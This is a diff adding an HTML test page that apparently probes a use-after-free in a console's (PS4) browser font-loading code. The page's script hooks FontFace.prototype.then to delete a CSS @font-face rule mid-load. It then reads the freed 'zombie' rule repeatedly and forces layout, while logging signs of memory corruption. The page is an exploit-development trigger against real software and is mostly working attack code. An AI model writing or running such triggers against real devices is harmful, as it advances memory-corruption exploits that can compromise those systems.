@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — UAF focus (12)</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
+#status { font-size: 16px; margin-bottom: 6px; color: #ff0; }
+#summary { color: #aaa; font-size: 12px; margin-bottom: 8px; line-height: 1.5; }
+#log { height: 68vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 11px; }
+.ok { color: #0f0; } .bad { color: #f66; } .weird { color: #ff6; }
+#t { font-family: x; font-size: 96px; color: #fff; line-height: 1; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">UAF focus probe running...</div>
+<div id="summary">One session. Quit browser after. UAF = SIGSEGV, not OOM. Use crash.html + refresh for OOM test.</div>
+<div id="log"></div>
+<div id="t">AB</div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    var summaryEl = document.getElementById('summary');
+    window.ps4log = function (msg, cls) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        if (cls) line.className = cls;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, c) { statusEl.textContent = msg; if (c) statusEl.style.color = c; };
+    window.ps4summary = function (msg) { summaryEl.textContent = msg; };
+})();
+
+var verdict = { pass: 0, fail: 0, weird: 0, lines: [] };
+
+function pass(msg) {
+    verdict.pass++;
+    verdict.lines.push('✓ ' + msg);
+    ps4log('✓ SUCCESS: ' + msg, 'ok');
+}
+function fail(msg) {
+    verdict.fail++;
+    verdict.lines.push('✗ ' + msg);
+    ps4log('✗ FAILED: ' + msg, 'bad');
+}
+function weird(msg) {
+    verdict.weird++;
+    verdict.lines.push('! ' + msg);
+    ps4log('! WEIRD: ' + msg, 'weird');
+}
+
+function dumpFonts(label) {
+    ps4log('--- ' + label + ' size=' + document.fonts.size + ' status=' + document.fonts.status);
+    var i = 0;
+    document.fonts.forEach(function (f) {
+        ps4log('  [' + i + '] family=' + f.family + ' status=' + f.status);
+        i++;
+    });
+}
+
+function renderText(text, label) {
+    var el = document.getElementById('t');
+    el.textContent = text;
+    el.style.fontFamily = 'x, sans-serif';
+    var w = el.offsetWidth;
+    var h = el.offsetHeight;
+    ps4log('render ' + label + ' "' + text + '" offset=' + w + 'x' + h);
+    document.body.offsetTop;
+    document.documentElement.offsetTop;
+    return w;
+}
+
+function tryLoad(label, text) {
+    return document.fonts.load('1em x', text).then(function (faces) {
+        ps4log(label + ' count=' + faces.length);
+        for (var j = 0; j < faces.length; j++) {
+            ps4log('  [' + j + '] family=' + faces[j].family + ' status=' + faces[j].status);
+        }
+        return faces;
+    }).catch(function (e) {
+        ps4log(label + ' error: ' + e);
+        return null;
+    });
+}
+
+function staleReadLoop(staleRule, n, label) {
+    var ok = 0;
+    for (var i = 0; i < n; i++) {
+        try {
+            if (staleRule.cssText.indexOf('nonexistent') !== -1) ok++;
+        } catch (e) {
+            ps4log(label + ' read threw at i=' + i + ': ' + e);
+            return -1;
+        }
+    }
+    ps4log(label + ' ' + ok + '/' + n + ' reads OK');
+    return ok;
+}
+
+function printFinalSummary() {
+    ps4log('========== FINAL SUMMARY ==========');
+    for (var i = 0; i < verdict.lines.length; i++) ps4log(verdict.lines[i]);
+    ps4log('Passed: ' + verdict.pass + '  Failed: ' + verdict.fail + '  Weird: ' + verdict.weird);
+    ps4log('');
+    ps4log('UAF confirmed = native crash (CE-36329-3), NOT "not enough memory"');
+    ps4log('OOM test = use crash.html and refresh');
+
+    if (verdict.weird >= 3) {
+        ps4summary('High weird count — stale state very broken. Good for UAF research.');
+        ps4status('interesting — read WEIRD', '#ff6');
+    } else if (verdict.pass >= 10) {
+        ps4summary('All lifecycle steps OK. No native UAF signal in JS — try again or use debugger.');
+        ps4status('lifecycle OK — no JS-visible UAF', '#0f0');
+    } else {
+        ps4summary('Mixed — read FAILED lines.');
+        ps4status('mixed result', '#ff0');
+    }
+}
+
+/* ---- main UAF-focused sequence ---- */
+window.onload = function () {
+    ps4log('Phase 3l — UAF focus (12)');
+    ps4log('UA: ' + navigator.userAgent);
+    ps4log('');
+
+    var sheet = document.getElementById('s').sheet;
+    var staleRule = sheet.cssRules[0];
+    pass('Step 1: held stale ref to cssRules[0]');
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    pass('Step 2: FontFace A added, void A.loaded before hook');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('Step 3: TRIGGER (UAF window open)');
+
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                pass('Step 3a: y/z FontFaces created in reentrant callback');
+
+                sheet.deleteRule(0);
+                pass('Step 3b: deleteRule(0) — CSS B face removed mid-load');
+
+                document.getElementById('t').textContent = 'B';
+                document.body.offsetTop;
+                document.documentElement.offsetTop;
+                pass('Step 3c: layout flush during load');
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    ps4log('Step 4: document.fonts.load(AB) dispatched');
+
+    setTimeout(function () {
+        if (!fired) {
+            fail('Trigger never fired — invalid run');
+            printFinalSummary();
+            return;
+        }
+        pass('Step 4: trigger completed');
+
+        try {
+            if (staleRule.cssText.length > 0) pass('Step 5: READ zombie cssText after delete');
+            else fail('Zombie cssText empty');
+        } catch (e) {
+            fail('Zombie read threw: ' + e);
+        }
+
+        if (sheet.cssRules.length === 0) pass('Step 5b: stylesheet empty after delete');
+        else fail('Stylesheet not empty: ' + sheet.cssRules.length);
+
+        sheet.insertRule(
+            "@font-face { font-family: x; src: local(Helvetica Bold); unicode-range: U+0042; }",
+            0
+        );
+        var newRule = sheet.cssRules[0];
+        pass('Step 6: re-insert live @font-face for B');
+
+        if (staleRule !== newRule) {
+            pass('Step 6b: dual object — zombie !== live rule');
+        } else {
+            weird('Zombie and live rule are same object');
+        }
+
+        if (staleRule.cssText.indexOf('nonexistent-font.woff') !== -1) {
+            pass('Step 6c: zombie still has OLD url');
+        }
+
+        dumpFonts('after dual-object setup');
+
+        var checkA = document.fonts.check('1em x', 'A');
+        var checkB = document.fonts.check('1em x', 'B');
+        var checkAB = document.fonts.check('1em x', 'AB');
+        ps4log('check A=' + checkA + ' B=' + checkB + ' AB=' + checkAB);
+        if (checkB) {
+            weird('Step 7: check(B)=true — stale lookup may point at freed face');
+        } else {
+            pass('Step 7: check(B)=false after re-insert');
+        }
+
+        var reads = staleReadLoop(staleRule, 100, 'Step 8: zombie read loop');
+        if (reads === 100) pass('Step 8: 100 zombie reads stable');
+        else if (reads < 0) fail('Step 8: zombie read crashed');
+        else weird('Step 8: zombie cssText changed during loop');
+
+        renderText('B', 'Step 9a');
+        renderText('AB', 'Step 9b');
+        renderText('A', 'Step 9c');
+        pass('Step 9: render B, AB, A with font x');
+
+        Promise.resolve().then(function () {
+            return tryLoad('Step 10a load(B)', 'B');
+        }).then(function (rB) {
+            if (rB && rB.length > 0) pass('Step 10a: load(B) returned faces');
+            else if (checkB) weird('Step 10a: check(B) true but load(B) empty — UAF-adjacent mismatch');
+            else fail('Step 10a: load(B) got nothing');
+
+            return tryLoad('Step 10b load(AB)', 'AB');
+        }).then(function (rAB) {
+            if (rAB && rAB.length > 0) pass('Step 10b: load(AB) returned faces');
+
+            return tryLoad('Step 10c load(B) again', 'B');
+        }).then(function (rB2) {
+            if (rB2 && rB2.length > 0) pass('Step 10c: second load(B) returned faces');
+
+            return Promise.all([
+                tryLoad('Step 11 concurrent B', 'B'),
+                tryLoad('Step 11 concurrent AB', 'AB'),
+                A.loaded
+            ]);
+        }).then(function () {
+            pass('Step 11: concurrent load wave finished (see errors above)');
+
+            staleReadLoop(staleRule, 50, 'Step 12: post-load zombie reads');
+            renderText('B', 'Step 12b');
+            dumpFonts('final');
+
+            return document.fonts.ready;
+        }).then(function () {
+            pass('Step 13: document.fonts.ready resolved');
+            printFinalSummary();
+        }).catch(function (e) {
+            fail('Promise chain threw: ' + e);
+            printFinalSummary();
+        });
+
+        setTimeout(function () {
+            ps4log('--- Step 14: delayed wave (timer / loader) ---');
+            staleReadLoop(staleRule, 30, 'delayed zombie reads');
+            tryLoad('delayed load(B)', 'B');
+            tryLoad('delayed load(AB)', 'AB');
+            renderText('B', 'delayed');
+            ps4log('Step 14 dispatched (results above when they arrive)');
+        }, 200);
+
+    }, 600);
+};
+</script>
+</body>
+</html>
